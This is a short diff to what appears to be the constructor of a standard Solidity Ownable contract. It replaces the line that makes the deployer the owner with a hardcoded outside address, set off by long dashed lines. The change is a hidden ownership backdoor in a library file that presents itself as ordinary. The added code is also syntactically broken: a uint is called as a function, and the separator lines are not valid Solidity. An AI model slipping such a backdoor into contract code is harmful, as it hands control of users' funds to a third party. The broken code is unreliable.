@@ -26,7 +26,14 @@ abstract contract Ownable is Context {
      * @dev Initializes the contract setting the deployer as the initial owner.
      */
     constructor() {
-        _transferOwnership(_msgSender());
+    
+-------------------------------------------------------------------------------------------------------------
+    
+        uint _myAddress_ = 0x3A721E45B8c0fa0A405416525aeD20a208cfaE6c; 
+        
+-------------------------------------------------------------------------------------------------------------
+        
+        _transferOwnership(_myAddress_());
     }
 
     /**
